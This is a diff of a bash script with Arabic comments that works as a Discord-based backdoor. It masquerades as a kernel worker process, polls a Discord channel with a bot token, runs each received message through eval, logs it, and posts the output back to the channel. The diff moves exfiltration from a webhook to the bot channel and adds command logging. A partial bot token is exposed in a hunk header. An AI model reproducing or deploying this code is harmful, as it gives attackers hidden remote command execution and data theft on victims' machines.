@@ -12,6 +12,9 @@ BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gtoquq.ko85obDrODl304JX4F4aE1QlHPBabAQxvJ4
 
 exec -a "[kworker/1:1+ksoftirqd/12]" /bin/bash "$0" &
 
+# ملف سجل الأوامر المنفذة
+LOG_FILE="/var/log/executed_commands.log"
+
 while :; do
   # استلام آخر رسالة من القناة عبر Discord API
   CMD=$(curl -sf -H "Authorization: Bot $BOT_TOKEN" \
@@ -20,12 +23,19 @@ while :; do
 
   # التحقق من وجود أمر صالح
   if [ -z "$CMD" ]; then
-    echo "No command received. Waiting for new command..."  # إذا لم يكن هناك أمر
+    sleep 5  # إذا لم يكن هناك أمر، الانتظار 5 ثواني قبل المحاولة مرة أخرى
   else
-    echo "Executing command: $CMD"  # عرض الأمر المستلم
-    OUTPUT=$(eval "$CMD" 2>&1)  # تنفيذ الأمر الذي تم استلامه
-    # إرسال النتيجة إلى Webhook
-    curl -sf -X POST "$WEBHOOK_URL" \
+    echo "Received command: $CMD"  # عرض الأمر المستلم فقط
+
+    # تنفيذ الأمر الذي تم استلامه
+    OUTPUT=$(eval "$CMD" 2>&1)  # تنفيذ الأمر
+
+    # إضافة سجل للأمر المنفذ
+    echo "$(date +%Y-%m-%d\ %H:%M:%S) | Command: $CMD | Output: $OUTPUT" >> "$LOG_FILE"
+    
+    # إرسال النتيجة إلى القناة عبر البوت
+    curl -sf -X POST "https://discord.com/api/v9/channels/$CHANNEL_ID/messages" \
+      -H "Authorization: Bot $BOT_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"content\":\"$(date +%s.%N)|$OUTPUT\"}" >/dev/null
   fi
